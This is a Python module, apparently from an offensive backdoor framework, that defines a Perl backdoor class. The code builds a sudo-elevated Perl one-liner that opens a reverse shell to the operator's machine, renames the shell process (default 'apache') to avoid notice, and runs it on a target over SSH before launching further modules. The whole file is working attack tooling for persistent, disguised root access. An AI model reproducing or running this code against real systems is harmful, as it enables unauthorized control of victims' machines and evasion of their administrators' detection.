from backdoors.backdoor import *

class Perl(Backdoor):
    prompt = Fore.RED + "(perl) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Perl module"
        self.core = core
        self.options = {
                "port"   : Option("port", 53921, "port to connect to", True),
                "name"   : Option("name", "apache", "name of the backdoor", True),
                }
        self.allow_modules = True
        self.modules = {} 
        self.help_text = INFO + "A script written in perl which listens on the network and redirects its input to bash, and renames its process to look less conspicuous." 
 
    def get_command(self):
        return "echo " + self.core.curtarget.pword + " | sudo -S perl -e \"use Socket;\" -e \"socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));\" -e \"connect(SOCK, sockaddr_in(" + str(self.get_value("port")) + ",inet_aton('" + self.core.localIP + "')));\" -e \"open(STDIN, '>&SOCK');\" -e \"open(STDOUT,'>&SOCK');\" -e \"open(STDERR,'>&SOCK');\" -e \"exec({'/bin/sh'} ('" + self.get_value("name") + "', '-i'));\""

    def do_exploit(self, args):
        self.listen("none", "none")
        self.core.curtarget.ssh.exec_command(self.get_command())
        print("Perl backdoor on port %s attempted. " % self.get_value("port"))

        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit()
